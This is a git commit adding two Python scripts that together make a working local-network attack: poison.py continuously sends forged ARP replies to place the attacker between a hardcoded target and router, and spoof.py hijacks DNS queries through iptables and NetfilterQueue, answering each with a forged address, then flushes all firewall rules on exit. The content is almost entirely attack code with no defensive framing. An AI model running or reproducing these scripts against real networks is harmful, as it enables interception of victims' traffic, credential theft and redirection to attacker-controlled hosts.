fa759b3be1fbf9a14ec09b21e278e847219ceeea
Hakus <altenotiz@gmail.com>
2015-11-05 23:13:10 -0800

    Initial commit. Basic functionality.

---
+++ poison.py
@@ -0,0 +1,21 @@
+from scapy.all import *
+import os
+from time import sleep
+
+def main():
+    routerIP = "192.168.0.100"
+    targetIP = "192.168.0.21"
+    routerMAC = "00:1a:6d:38:15:ff"
+    targetMAC = "98:90:96:dd:01:5c"
+    hostMAC = "98:90:96:dc:ee:77"
+
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+    while 1:
+        sendp(Ether(src=hostMAC, dst=targetMAC)/ARP(op=2, pdst=targetIP, psrc=routerIP, hwdst=targetMAC))
+        sendp(Ether(src=hostMAC, dst=routerMAC)/ARP(op=2, pdst=routerIP, psrc=targetIP, hwdst=routerMAC))
+        sleep(2)
+
+
+if __name__ == '__main__':
+    main()
---
+++ spoof.py
@@ -0,0 +1,29 @@
+from netfilterqueue import NetfilterQueue
+from scapy.all import *
+import os
+
+def parse(packet):
+    pkt = IP(packet.get_payload())
+    if not pkt.haslayer(DNSQR):
+        packet.accept()
+    else:
+        spkt =  (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
+                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
+                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata="192.168.0.18")))
+        packet.set_payload(str(spkt))
+        packet.accept()
+
+def main():
+    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
+    nfqueue = NetfilterQueue()
+    nfqueue.bind(1, parse)
+    try:
+        nfqueue.run()
+    except KeyboardInterrupt:
+        nfqueue.unbind()
+        os.system('iptables -F')
+        os.system('iptables -t nat -F')
+
+if __name__ == '__main__':
+    main()
